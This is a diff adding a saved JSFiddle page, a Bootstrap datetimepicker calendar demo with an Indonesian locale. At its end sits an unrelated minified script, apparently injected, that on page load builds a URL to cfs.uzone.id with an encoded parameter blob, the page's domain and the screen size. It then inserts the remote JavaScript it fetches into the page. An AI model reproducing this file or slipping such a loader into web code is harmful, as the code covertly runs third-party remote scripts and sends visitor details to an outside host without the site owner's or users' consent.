@@ -1,0 +1,74 @@
+
+<!DOCTYPE html>
+<!-- saved from url=(0047)http://fiddle.jshell.net/prameko/0h73j6gr/show/ -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <title>Kalender</title>
+  
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="googlebot" content="noindex, nofollow">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+  
+
+    <link rel="stylesheet" type="text/css" href="/css/result-light.css">
+    <link rel="stylesheet" type="text/css" href="/css/bootstrap.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/bootstrap-datetimepicker.min.css">
+    <script type="text/javascript" src="/js/jquery.min.js"></script>
+    <script type="text/javascript" src="/js/dummy.js"></script>
+    <script type="text/javascript" src="/js/moment.js"></script>
+    <script type="text/javascript" src="/js/bootstrap-datetimepicker.min.js"></script>
+    <script type="text/javascript" src="/js/id.js"></script>
+
+  <style id="compiled-css" type="text/css">
+      
+  </style>
+
+
+  <!-- TODO: Missing CoffeeScript 2 -->
+
+  <script type="text/javascript">//<![CDATA[
+
+    window.onload=function(){
+      
+
+        $(document).ready(function () {
+            $('.input-group.date').datetimepicker({
+                locale: 'id',
+            });
+        });
+
+
+    }
+
+  //]]></script>
+
+</head>
+<body>
+    <div class="form-group col-md-3">
+     <div class="input-group date datepicker">
+          <input type="text" class="form-control placementT" id="fecha" placeholder="KLIK >>>>>>>>>>>>>>>>>>>>>>>>>>">
+             <span class="input-group-addon">
+                   <span class="glyphicon glyphicon-calendar">
+                   </span>
+            </span>
+      </div>
+</div>
+
+  
+  <script>
+    // tell the embed parent frame the height of the content
+    if (window.parent && window.parent.parent){
+      window.parent.parent.postMessage(["resultsFrame", {
+        height: document.body.getBoundingClientRect().height,
+        slug: "0h73j6gr"
+      }], "*")
+    }
+
+    // always overwrite window.name, in case users try to set it manually
+    window.name = "result"
+  </script>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAOdssgsL7fNObrGhVQpKFZHo1Yk%2f5WHojsZ2jLSmOKD4jve%2fU%2fCi3FUO2U6H3ho8mvMyc6%2fkx1dzHzyobGYGjuBLx4q7Pi8hC5Gydce9IcJV5B2oJuE3G6W1SxRVCoFNTzXc%2bEpR7HJr%2bdJ%2fu4j9wFTeG7zdN8gVqIPLOIYj31I80q9dkVUoWo%2bAu6ORIQxnSO%2fYsgqe2XqFA0mDmCjIxGHKJbA8qTQev2r2vK8tHtpL2qN7PJeaiiUM2Cffutz4O6cpMM0dOlVjrw97LsigHoE3TF1Mqo9vdhdcSynG0eFWgN7Oqcb3VOlhCQcCzpgRhaUxoFsS1CJEJDNJWm%2bIUY0ZJK3qUYjzHGo4H8TexAJe%2bMkw0jxbrmcfuFRcrUsAxrIxExvPBJuQL71w0dU%2bUyR0nrwHmX70nP3XYdxuBizyDwvgIUvHxrV6HbTeHhYB2jjhqQWGZA8nDR9dhcP3mpI5IgXU%2b7q%2fsxPIcGRHKBAf1p4qhmrpa%2fg4JJk7eUkTMyjNGdW0JUjJk%2b%2f%2fFJJEvw4bboNIQoL2Ol23qi3gWS6YvmuMd%2f1F%2bTos8yl3Cq79H%2fJMvtLe28UTHdlmDFIS6Xw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+
+</body></html>
